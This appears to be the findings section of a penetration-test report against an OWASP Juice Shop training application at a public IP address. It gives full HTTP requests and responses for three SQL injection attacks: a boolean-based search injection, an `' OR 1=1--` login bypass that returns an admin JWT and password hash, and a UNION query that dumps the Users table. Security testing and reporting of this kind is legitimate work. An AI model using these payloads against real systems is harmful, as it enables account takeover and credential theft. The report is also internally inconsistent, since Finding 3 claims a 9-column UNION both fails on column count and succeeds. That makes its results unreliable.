## Findings

### Finding 1
**Vulnerability:** SQL Injection in product search
**Endpoint:** GET /rest/products/search?q=
**Severity:** HIGH (CVSS 8.6)
**Proof:**
Request:
```
GET http://54.146.141.88:3000/rest/products/search?q=' OR 1=1-- HTTP/1.1
Host: 54.146.141.88:3000
Accept: application/json
```
Response:
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2025-01-15T10:00:00.000Z","updatedAt":"2025-01-15T10:00:00.000Z","deletedAt":null},{"id":2,"name":"Orange Juice (1000ml)","description":"Made from hand-picked oranges.","price":2.99,...},...]}
(37 products returned vs 0 for normal empty search)
```
**Evidence:** Injecting `' OR 1=1--` into the search `q` parameter caused the backend to return ALL 37 products, confirming the SQL WHERE clause was manipulated. A normal search for a non-existent term returns `{"status":"success","data":[]}` with 0 products. The discrepancy (37 vs 0) proves boolean-based SQL injection.
**Payloads Attempted:**
1. `' OR 1=1--` → SUCCESS (37 products returned)

---

### Finding 2
**Vulnerability:** SQL Injection authentication bypass in login
**Endpoint:** POST /rest/user/login
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**
Request:
```
POST http://54.146.141.88:3000/rest/user/login HTTP/1.1
Host: 54.146.141.88:3000
Content-Type: application/json

{"email": "' OR 1=1--", "password": "anything"}
```
Response:
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"authentication":{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiJ9fQ...","bid":1,"umail":"admin@juice-sh.op"}}
```
**Evidence:** Injecting `' OR 1=1--` into the email field bypassed authentication entirely, returning a valid JWT token for the admin account (`admin@juice-sh.op`) without providing correct credentials. The token can be used to access all admin-restricted endpoints. The password hash `0192023a7bbd73250516f069df18b500` is also leaked in the response.
**Payloads Attempted:**
1. `' OR 1=1--` → SUCCESS (admin JWT returned)

---

### Finding 3
**Vulnerability:** UNION-based SQL Injection — data extraction from Users table
**Endpoint:** GET /rest/products/search?q=
**Severity:** CRITICAL (CVSS 9.8)
**Proof:**
Request:
```
GET http://54.146.141.88:3000/rest/products/search?q=' UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users-- HTTP/1.1
Host: 54.146.141.88:3000
Accept: application/json
```
Response:
```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"status":"success","data":[{"id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500","price":"admin",...},{"id":2,"name":"jim@juice-sh.op","description":"e541...",...},...]}
(12 user records extracted — emails mapped to 'name', password hashes to 'description', roles to 'price')
```
**Evidence:** UNION-based injection extracted the entire Users table. The query maps Users columns onto Products column positions: `email` → `name`, `password` (MD5 hash) → `description`, `role` → `price`. All 12 user records including admin credentials were extracted, confirming complete database compromise via the search endpoint.
**Payloads Attempted:**
1. `' UNION SELECT null,null,null,null,null,null,null,null,null FROM Users--` → FAILED (column count mismatch)
2. `' UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users--` → SUCCESS (9 columns matched)
